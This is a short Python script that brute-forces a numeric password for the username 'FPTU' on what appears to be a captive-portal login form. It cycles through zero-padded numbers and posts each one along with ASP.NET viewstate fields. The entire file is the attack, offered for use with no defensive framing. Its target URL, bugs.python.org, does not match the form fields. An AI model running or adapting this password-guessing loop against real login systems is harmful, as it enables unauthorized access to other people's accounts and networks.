import requests
for i in range(99999999):
    pad = len(str(i))
    payload = (8 - pad%8) * '0' + str(i)
    Data = {
        '__VIEWSTATE': '%2FwEPDwUJOTQ3MTg1OTEwD2QWAgIDD2QWAgIBDxYCHglpbm5lcmh0bWwF6AE8ZW1iZWQgZmxhc2h2YXJzPSJmaWxlPXZpZGVvLzYubXA0JmF1dG9zdGFydD10cnVlJnN0YXJ0PTAmc2tpbj1za2luL25vcmRlbi56aXAmaW1hZ2U9b3ZlcnZpZXcuanBnJnN0cmV0Y2hpbmc9ZmlsbCJhbGxvd2Z1bGxzY3JlZW49InRydWUiYWxsb3dzY3JpcHRhY2Nlc3M9ImFsd2F5cyJpZD0icGxheWVyIm5hbWU9InBsYXllciJzcmM9InBsYXllci5zd2Yid2lkdGg9IjcyMHB4ImhlaWdodD0iNDA3cHgiIC8%2BZGTJGOKN330jKF87ktGCRRZcx0Q4Lw%3D%3D',
        '__VIEWSTATEGENERATOR': 'CA0B0334',
        'username': 'FPTU',
        'password': payload,
        'buttonClicked': 4,
        'err_flag': 0,
        'err_msg':'',
        'info_flag': 0,
        'info_msg': '',
        'redirect_url':'http%3A%2F%2Fhttp%3A%2F%2Fhttp%3A%2F%2F1.1.1.1%2F'
        }
    r = requests.post("http://bugs.python.org", data=Data)
    print(r.text)